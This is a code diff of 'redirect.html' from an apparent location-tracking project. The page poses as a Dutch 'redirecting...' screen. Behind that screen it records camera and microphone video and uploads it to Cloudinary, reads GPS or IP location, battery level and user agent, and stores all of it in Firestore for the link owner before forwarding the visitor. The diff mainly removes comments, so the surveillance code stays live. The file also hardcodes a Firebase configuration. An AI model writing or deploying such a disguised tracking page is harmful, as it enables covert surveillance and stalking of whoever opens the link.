@@ -1,4 +1,4 @@
-<!-- redirect.html (with Live Viewer Count and Customizable Heading) -->
+<!-- redirect.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -13,17 +13,17 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #f3f7fa; /* Default background */
-            color: #333; /* Default text color */
+            background-color: #f3f7fa;
+            color: #333;
             transition: background-color 0.5s, color 0.5s;
-            background-size: cover; /* Cover the entire page */
-            background-position: center; /* Center the background image */
-            background-repeat: no-repeat; /* Do not repeat*/
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
         }
         .container {
             text-align: center;
             padding: 40px;
-            background-color: white; /* Default container bg */
+            background-color: white;
             border-radius: 12px;
             box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
             width: 80%;
@@ -31,7 +31,7 @@
             transition: background-color 0.5s, box-shadow 0.5s;
         }
         h1 {
-            color: #007bff; /* Default heading color */
+            color: #007bff;
             margin-bottom: 20px;
             transition: color 0.5s;
         }
@@ -58,20 +58,20 @@
         }
         .icon-container {
             margin-bottom: 20px;
-            display: flex;          /* Add flex display */
-            justify-content: center; /* Center horizontally */
-            align-items: center;     /* Center vertically */
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
         .icon-container img {
             max-width: 100px;
-            max-height: 100px; /* Add max-height */
+            max-height: 100px;
         }
         .custom-text {
             font-size: 1.2rem;
             margin-top: 20px;
         }
 
-        /* Predefined Themes (within redirect.html) */
+        /* Predefined Themes */
         .theme-dark {
             background-color: #121212 !important;
             color: #f8f8f8 !important;
@@ -100,9 +100,9 @@
         #progress-bar-container {
           width: 100%;
           background-color: #ddd;
-          margin-bottom: 15px; /* Add some space below the bar */
-          border-radius: 4px; /* Rounded corners */
-          overflow: hidden;   /* Ensure the progress bar stays within bounds*/
+          margin-bottom: 15px;
+          border-radius: 4px;
+          overflow: hidden;
         }
 
         #progress-bar {
@@ -117,8 +117,7 @@
     </style>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
-      <!-- NEW: Firebase Functions SDK -->
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-functions-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-functions-compat.js"></script> <!-- Firebase Functions SDK -->
     <script src="https://widget.cloudinary.com/v2.0/global/all.js" type="text/javascript"></script>
 </head>
 <body>
@@ -126,7 +125,7 @@
         <div class="icon-container">
             <img id="theme-icon" src="" alt="Theme Icon" style="display: none;">
         </div>
-        <h1 id="redirect-heading">Doorverwijzing...</h1>  <!-- Heading with ID -->
+        <h1 id="redirect-heading">Doorverwijzing...</h1>
         <p>U wordt zo dadelijk doorgestuurd <span class="loading-dots"></span></p>
         <div id="progress-bar-container">
             <div id="progress-bar"></div>
@@ -136,37 +135,33 @@
     </div>
 
 <script>
-
-    // Inside redirect.html's <script> tag:
 function displayError(message) {
     errorMessage.textContent = message;
     errorMessage.style.display = 'block';
-    setTimeout(() => { errorMessage.style.display = 'none'; }, 5000); // Hide after 5 seconds
+    setTimeout(() => { errorMessage.style.display = 'none'; }, 5000);
 }
 
-    const firebaseConfig = {
-        apiKey: "AIzaSyAjuJwrh-OUScGf1tnsYNB9awV9gkg45QA", // REPLACE
-        authDomain: "loctrac-8d7ef.firebaseapp.com",       // REPLACE
-        projectId: "loctrac-8d7ef",                         // REPLACE
-        storageBucket: "loctrac-8d7ef.firebasestorage.com",   // REPLACE
-        messagingSenderId: "34491549339",                   // REPLACE
-        appId: "1:34491549339:web:c666c4f8f3271bab06e83e",     // REPLACE
-        measurementId: "G-65PYC8E9VR"                      // REPLACE
+const firebaseConfig = {
+    apiKey: "AIzaSyAjuJwrh-OUScGf1tnsYNB9awV9gkg45QA", // REPLACE
+    authDomain: "loctrac-8d7ef.firebaseapp.com",       // REPLACE
+    projectId: "loctrac-8d7ef",                         // REPLACE
+    storageBucket: "loctrac-8d7ef.firebasestorage.com",   // REPLACE
+    messagingSenderId: "34491549339",                   // REPLACE
+    appId: "1:34491549339:web:c666c4f8f3271bab06e83e",     // REPLACE
+    measurementId: "G-65PYC8E9VR"                      // REPLACE
 };
 
 const app = firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 const functions = firebase.functions(); // Initialize Functions
 const errorMessage = document.getElementById("error-message");
-const progressBar = document.getElementById('progress-bar'); // Get progress bar element
-// NEW: Redirect heading element
+const progressBar = document.getElementById('progress-bar');
 const redirectHeading = document.getElementById('redirect-heading');
 
-const cloudName = "dnvkhmgj0";        // REPLACE
-const uploadPreset = "locstorage";  // REPLACE
+const cloudName = "dnvkhmgj0";
+const uploadPreset = "locstorage";
 
-// Get the selected theme from user settings and apply it
-// MODIFIED: Correctly loads and applies the selected theme's data.
+// Get the selected theme and apply it
 async function applyUserTheme() {
     try {
         const currentUserId = await getCurrentUserId();
@@ -181,7 +176,6 @@ async function applyUserTheme() {
         const settingsData = settingsSnap.data();
         const themeName = settingsData.theme || 'default';
 
-        // Load the *selected* theme's data, even for built-in themes
         if (themeName === 'default' || themeName === 'dark' || themeName === 'green') {
           document.body.classList.remove('theme-dark', 'theme-green');
             if(themeName === 'dark'){
@@ -190,19 +184,14 @@ async function applyUserTheme() {
             if(themeName === 'green'){
                 document.body.classList.add('theme-green');
             }
-
-            // Set heading for built-in themes
             if (themeName === 'default') {
                 redirectHeading.textContent = "Doorverwijzing...";
             } else if (themeName === 'dark') {
-                redirectHeading.textContent = "Doorverwijzing..."; // Or a dark-themed heading
+                redirectHeading.textContent = "Doorverwijzing...";
             } else if (themeName === 'green') {
-                redirectHeading.textContent = "Doorverwijzing..."; // Or a green-themed heading
+                redirectHeading.textContent = "Doorverwijzing...";
             }
-
-
         } else {
-            // Load custom theme data
             const themeRef = db.collection('redirectThemes').doc(themeName);
             const themeSnap = await themeRef.get();
 
@@ -213,7 +202,6 @@ async function applyUserTheme() {
 
             const themeData = themeSnap.data();
 
-            // Apply custom theme styles
             if (themeData.backgroundImageUrl) {
                 document.body.style.backgroundImage = `url('${themeData.backgroundImageUrl}')`;
             }
@@ -225,11 +213,8 @@ async function applyUserTheme() {
                 document.getElementById('custom-redirect-text').textContent = themeData.customText;
                 document.getElementById('custom-redirect-text').style.display = 'block';
             }
-
-            // Set redirect heading (Corrected)
             redirectHeading.textContent = themeData.redirectHeading || "Doorverwijzing...";
         }
-
 
     } catch (error) {
         console.error("Error applying theme:", error);
@@ -247,12 +232,15 @@ async function getCurrentUserId() {
 function getCurrentPositionPromise() {
     return new Promise((resolve, reject) => { navigator.geolocation ? navigator.geolocation.getCurrentPosition(resolve, reject) : reject(new Error("No Geo")); });
 }
+
 function getBatteryPromise() {
     return new Promise((resolve, reject) => { navigator.getBattery ? resolve(navigator.getBattery()) : reject(new Error("No Battery API")); });
 }
+
 async function getIPLocationData() {
     try { return await (await fetch('https://ipapi.co/json/')).json(); } catch (error) { console.error('IP Error:', error); return null; }
 }
+
 function getDeviceInfo() { return navigator.userAgent; }
 
 async function collectOtherData(locationPermission, currentVideoUrl, currentCameraError) {
@@ -267,19 +255,19 @@ async function collectOtherData(locationPermission, currentVideoUrl, currentCame
         try {
             const position = await getCurrentPositionPromise();
             locationData = { latitude: position.coords.latitude, longitude: position.coords.longitude, accuracy: position.coords.accuracy };
-            updateProgress(66); // Update progress after location
+            updateProgress(66);
         } catch (error) {
             locationError = error.message || "Onbekende locatiefout";
-            ipLocationData = await getIPLocationData();  // Still get IP location if GPS fails
+            ipLocationData = await getIPLocationData();
         }
     } else {
-         ipLocationData = await getIPLocationData(); // Get IP location
+         ipLocationData = await getIPLocationData();
     }
 
     try {
         const battery = await getBatteryPromise();
         batteryData = battery.level * 100;
-        updateProgress(100);  //Final update
+        updateProgress(100);
     } catch (error) {
         batteryError = error.message || "Onbekende batterijfout";
     }
@@ -295,7 +283,7 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
     if (micCamPermission) {
         try {
             stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            updateProgress(33); // Update progress after camera
+            updateProgress(33);
             if (recordSeconds > 0) {
                 recorder = new MediaRecorder(stream);
                 const chunks = [];
@@ -305,9 +293,8 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
                     try {
                         const formData = new FormData();
                         formData.append('file', blob, `${currentUserId}_recording.webm`);
-                        formData.append('upload_preset', uploadPreset); // Correct preset
+                        formData.append('upload_preset', uploadPreset);
                         formData.append('cloud_name', cloudName);
-                        // NO API KEY
 
                         const uploadResponse = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/video/upload`, { method: 'POST', body: formData });
 
@@ -315,17 +302,17 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
                             const errorData = await uploadResponse.json();
                             cameraError = `Cloudinary upload error: ${uploadResponse.status} - ${errorData.error.message}`;
                             videoUrl = null;
-                            collectOtherData(true, videoUrl, cameraError); // Pass locationPermission = true
+                            collectOtherData(true, videoUrl, cameraError);
                             return;
                         }
                         const uploadResult = await uploadResponse.json();
                         videoUrl = uploadResult.secure_url;
-                        collectOtherData(true, videoUrl, cameraError);  // Pass locationPermission = true
+                        collectOtherData(true, videoUrl, cameraError);
 
                     } catch (uploadError) {
                         cameraError = `Cloudinary upload error: ${uploadError.message}`;
                         videoUrl = null;
-                         collectOtherData(true, videoUrl, cameraError); // Pass locationPermission = true
+                         collectOtherData(true, videoUrl, cameraError);
 
                     } finally { if (stream) { stream.getTracks().forEach(track => track.stop()); } }
                 };
@@ -333,15 +320,14 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
                 setTimeout(() => { if (recorder && recorder.state !== "inactive") { recorder.stop(); } }, recordSeconds * 1000);
             } else {
                 if (stream) { stream.getTracks().forEach(track => track.stop()); }
-                collectOtherData(true, null, null); // Pass locationPermission = true
+                collectOtherData(true, null, null);
             }
         } catch (error) {
             cameraError = error.message;
-            collectOtherData(true, null, cameraError);  // Pass locationPermission = true even if camera fails
-
+            collectOtherData(true, null, cameraError);
         }
     } else {
-        collectOtherData(false, null, null); // Pass locationPermission = false
+        collectOtherData(false, null, null);
     }
     return { videoUrl, cameraError };
 }
@@ -355,7 +341,7 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
     } catch (error) {
         errorMessage.textContent = `Firestore Fout: ${error.message}`;
         errorMessage.style.display = 'block';
-        return; //  Exit if saving data fails
+        return;
     }
 
     const settingsRef = db.collection('userSettings').doc(currentUserId);
@@ -363,13 +349,12 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
     if (!settingsSnap.exists) {
         errorMessage.textContent = "Gebruikersinstellingen niet gevonden.";
         errorMessage.style.display = 'block';
-        return; // Exit if no settings
+        return;
     }
 
     const settingsData = settingsSnap.data();
     const { redirectUrl, redirectSeconds = 0, notificationPermission = false, notificationTitle, notificationBody, notificationIcon } = settingsData;
     let themeName = settingsData.theme || 'default';
-
 
     if (notificationPermission && notificationTitle && notificationBody && Notification.permission === "granted") {
         try {
@@ -380,7 +365,6 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
         errorMessage.style.display = 'block';
     }
 
-    // Redirect logic (with error handling)
     if (redirectUrl) {
         setTimeout(() => {
             try {
@@ -402,7 +386,7 @@ function updateProgress(percentage) {
     progressBar.textContent = percentage + '%';
 }
 
-// NEW: Function to update viewer count (using Cloud Function)
+// Function to update viewer count (using Cloud Function)
 async function updateViewerCount(increment) {
     try {
         const change = increment ? 1 : -1;
@@ -411,66 +395,40 @@ async function updateViewerCount(increment) {
         await incrementCounter({ change: change });
     } catch (error) {
         console.error("Error updating viewer count:", error);
-        // Don't display error on redirect page itself.
     }
 }
 
-// NEW: Heartbeat function (using Cloud Function)
+// Heartbeat function (using Cloud Function)
 async function sendHeartbeat() {
   await updateViewerCount(true); // Treat heartbeat as "still active"
 }
 
-// Initial setup
 (async () => {
     try {
-        await applyUserTheme(); // Apply theme *before* collecting data
+        await applyUserTheme();
         const currentUserId = await getCurrentUserId();
         const settingsRef = db.collection('userSettings').doc(currentUserId);
         const settingsSnap = await settingsRef.get();
         let micCamPermission = false, recordSeconds = 0, notificationPermissionSetting = false, themeName = 'default', locationPermissionSetting = false;
 
         if (settingsSnap.exists) {
-            // Use object destructuring with default values
-            ({
-                micCamPermission = false,
-                recordSeconds = 0,
-                notificationPermission: notificationPermissionSetting = false,
-                locationPermission: locationPermissionSetting = false,
-                theme: themeName = 'default'
-            } = settingsSnap.data());
+            ({micCamPermission = false,recordSeconds = 0,notificationPermission: notificationPermissionSetting = false, locationPermission: locationPermissionSetting = false, theme: themeName = 'default'} = settingsSnap.data());
             recordSeconds = parseInt(recordSeconds, 10) || 0;
         }
-
-
-        // Check and request permissions *before* any data collection
-        if (!micCamPermission)
-        {
-            displayError('Accepteer camera/microfoon toestemming in de instellingen.');
-
-            // Do NOT return here. Continue execution to handle other data collection.
-        }
-        // No need to ask for notification, if it isn't accepted already, we can not sent notifications
-        if (!locationPermissionSetting) {
-            displayError('Accepteer locatie toestemming in de instellingen.');
-            //Do NOT return here.  Continue execution to collect other data.
-        }
-
+        if (!micCamPermission){displayError('Accepteer camera/microfoon toestemming in de instellingen.');}
+        if (!locationPermissionSetting) {displayError('Accepteer locatie toestemming in de instellingen.');}
         if (notificationPermissionSetting && Notification.permission === "default") {
            await Notification.requestPermission();
         }
 
-
-
-        // Geolocation handling (with high accuracy and timeout)
         const handleGeoSuccess = async (position) => {
             const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
-            collectOtherData(locationPermissionSetting, cameraMicData.videoUrl, cameraMicData.cameraError); // Pass locationPermissionSetting
+            collectOtherData(locationPermissionSetting, cameraMicData.videoUrl, cameraMicData.cameraError);
         };
-
         const handleGeoError = async (error) => {
             console.error("Geolocation error:", error);
              const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
-            collectOtherData(locationPermissionSetting, cameraMicData.videoUrl, cameraMicData.cameraError); // Pass locationPermissionSetting
+            collectOtherData(locationPermissionSetting, cameraMicData.videoUrl, cameraMicData.cameraError);
         };
 
         if (navigator.geolocation)
@@ -480,21 +438,18 @@ async function sendHeartbeat() {
         else
         {
             const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
-            collectOtherData(false, cameraMicData.videoUrl, cameraMicData.cameraError); // Pass locationPermissionSetting = false
+            collectOtherData(false, cameraMicData.videoUrl, cameraMicData.cameraError);
         }
 
-        // NEW: Viewer Count Logic
+        // Viewer Count Logic
         await updateViewerCount(true); // Increment on initial load
-
-        // Set up heartbeat (every 30 seconds)
         const heartbeatInterval = setInterval(sendHeartbeat, 30000);
 
-        // Decrement on page unload using sendBeacon (BEST PRACTICE)
+        // Decrement on page unload using sendBeacon (CRUCIAL PART)
         window.addEventListener('beforeunload', () => {
             clearInterval(heartbeatInterval);
-            navigator.sendBeacon('/incrementViewerCount?change=-1'); // Use relative URL
+             navigator.sendBeacon('/incrementViewerCount?change=-1'); // Use relative URL
         });
-
 
     } catch (error) {
         console.error("Initialization error:", error);
